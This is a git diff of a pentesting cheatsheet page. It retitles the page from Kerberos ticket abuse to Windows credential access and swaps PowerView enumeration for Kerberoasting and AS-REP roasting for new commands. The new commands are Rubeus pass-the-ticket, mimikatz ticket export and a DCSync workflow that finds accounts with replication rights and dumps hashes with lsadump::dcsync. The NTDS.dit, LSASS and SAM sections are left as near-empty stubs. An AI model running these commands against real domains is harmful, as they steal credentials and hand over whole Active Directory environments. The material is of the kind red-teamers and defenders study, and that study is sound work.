@@ -1,23 +1,24 @@
 ---
 layout: post
-title: TA0006 Credentials Access - Steal or Forge Kerberos Tickets
+title: TA0006 Credentials Access - NTDS.dit, LSASS.exe, SAM
 parent: Pentesting
 category: Pentesting
 grand_parent: Cheatsheets
-modified_date: 2022-09-02
+modified_date: 2022-09-07
 permalink: /:categories/:title/
 ---
 
 <!-- vscode-markdown-toc -->
 * [PRE-REQUISITES](#PRE-REQUISITES)
 	* [WHICH OS ? WHAT CREDS ?](#WHICHOSWHATCREDS)
-	* [Rubeus Compilation](#RubeusCompilation)
-* [KERBEROS ASKTGT](#KERBEROSASKTGT)
-* [ENUM: KRB DOMAIN POLICIES](#ENUM:KRBDOMAINPOLICIES)
-* [ENUM: TARGETS](#ENUM:TARGETS)
-	* [Kerberoasting](#Kerberoasting)
-	* [AS-REPoasting](#AS-REPoasting)
-	* [User Accounts Status](#UserAccountsStatus)
+	* [Rubeus](#Rubeus)
+	* [Other tools](#Othertools)
+* [Kerberos Ticket Manipulations](#KerberosTicketManipulations)
+	* [Kerberos ASKTGT](#KerberosASKTGT)
+	* [Import / Export Tickets](#ImportExportTickets)
+* [DCSync attack](#DCSyncattack)
+* [NTDS.dit dump](#NTDS.ditdump)
+* [LSASS.exe dump](#LSASS.exedump)
 
 <!-- vscode-markdown-toc-config
 	numbering=false
@@ -31,82 +32,61 @@ permalink: /:categories/:title/
 
 ![Windows Credentials by Auth. Service & by OS](/assets/images/win-delpy-creds-table-by-os-til-2012.png)
 
-### <a name='RubeusCompilation'></a>Rubeus Compilation 
+### <a name='Rubeus'></a>Rubeus 
 ```powershell
-
+# compilation
 ```
 
-## <a name='KERBEROSASKTGT'></a>KERBEROS ASKTGT 
+### <a name='Othertools'></a>Other tools
+- [Mimikatz binaries]()
+- [Pypykatz]()
+- [Abusing kerberos using impacket](https://www.hackingarticles.in/abusing-kerberos-using-impacket/)
+
+## <a name='KerberosTicketManipulations'></a>Kerberos Ticket Manipulations 
+
+[Wiki Rubeus](https://github.com/GhostPack/Rubeus)
+
+### <a name='KerberosASKTGT'></a>Kerberos ASKTGT 
 ```powershell
 # Path on VM Mandiant Commando
 cd C:\Tools\GhostPack\Rubeus\Rubeus\bin\Debug
-./Rubeus.exe asktgt /user:$zlat_user /password:Password01 /domain:$zdom /dc:$zdom_dc_fqdn /ptt
+./Rubeus.exe asktgt /user:$zlat_user /password:"PASSWORD" /domain:$zdom /dc:$zdom_dc_fqdn /ptt
 ```
 
-## <a name='ENUM:KRBDOMAINPOLICIES'></a>ENUM: KRB DOMAIN POLICIES
+### <a name='ImportExportTickets'></a>Import / Export Tickets
 ```powershell
-Get-NetDomainController
-
-# enumerate the current domain controller policy
-$DCPolicy = Get-DomainPolicy -Policy <DC>
-$DCPolicy.PrivilegeRights # user privilege rights on the dc...
-
-# enumerate the current domain policy
-$DomainPolicy = Get-DomainPolicy -Policy Domain
-$DomainPolicy.KerberosPolicy # useful for golden tickets
-$DomainPolicy.SystemAccess # password age/etc.
-
-# get the domain policy settings for the passwords: history, complexicity, lockout, clear-text
-(Get-DomainPolicy)."system access"
+cd C:\tools\mimikatz\x64
+mimikatz.exe privilege:debug
+kerberos::list /export
 ```
 
-## <a name='ENUM:TARGETS'></a>ENUM: TARGETS
+## <a name='DCSyncattack'></a>DCSync attack
 
-### <a name='Kerberoasting'></a>Kerberoasting
+- [T1003.006](https://attack.mitre.org/techniques/T1003/006) DCSYNC
+
 ```powershell
-# find all users with an SPN set (likely service accounts)
-Get-DomainUser -SPN | select name, description, lastlogon, badpwdcount, logoncount, useraccountcontrol, memberof
+# get the account's SID 
+get-netuser $zlat_user -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | select objectsid
 
-# find all service accounts in "Domain Admins"
-Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}
+# retrieve *most* users who can perform DC replication for dev.<Domain>.local (i.e. DCsync)
+Get-DomainObjectAcl $zdom_dn -ResolveGUIDs  -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ? {
+    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
+}
 
-# Kerberoast any users in a particular OU with SPNs set
-Invoke-Kerberoast -SearchBase "LDAP://OU=secret,DC=<Domain>,DC=local"
+# check the ACL permissions
+Get-ObjectAcl -Identity $zdom_dn -DomainController $zdom_dc_fqdn -Domain $zdom_fqdn -ResolveGUIDs | ? {$_.ObjectSID -match "S-1-5-21-xxx"}
+
+# run the DCsync
+mimikatz.exe privilege:debug
+lsadump::dcsync /dc:$zdom_dc /domain:$zdom_fqdn /user:$zlat_user
 ```
 
-### <a name='AS-REPoasting'></a>AS-REPoasting
-```powershell
-# check for users who don't have kerberos preauthentication set
-Get-DomainUser -PreauthNotRequired
-Get-DomainUser -UACFilter DONT_REQ_PREAUTH
-```
+## <a name='NTDS.ditdump'></a>NTDS.dit dump
 
 
-### <a name='UserAccountsStatus'></a>User Accounts Status
-```powershell
-# get all users with passwords changed > 1 year ago, returning sam account names and password last set times
-$Date = (Get-Date).AddYears(-1).ToFileTime()
-Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset,useraccountcontrol
 
-# get the last password set of each user in the current domain
-Get-UserProperty -Properties pwdlastset
+## <a name='LSASS.exedump'></a>LSASS.exe dump
 
-# all users that require smart card authentication
-Get-DomainUser -LDAPFilter "(useraccountcontrol:1.2.840.113556.1.4.803:=262144)"
-Get-DomainUser -UACFilter SMARTCARD_REQUIRED
+- [lsassy](https://github.com/Hackndo/lsassy)
 
-# all users that *don't* require smart card authentication, only returning sam account names
-Get-DomainUser -LDAPFilter "(!useraccountcontrol:1.2.840.113556.1.4.803:=262144)" -Properties samaccountname
-Get-DomainUser -UACFilter NOT_SMARTCARD_REQUIRED -Properties samaccountname
-
-# if running in -sta mode, impersonate another credential a la "runas /netonly"
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat', $SecPassword)
-Invoke-UserImpersonation -Credential $Cred
-# ... action
-Invoke-RevertToSelf
-
-# check if any user passwords are set
-$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
-```
-
+## <a name='LSASS.exedump'></a>SAM dump
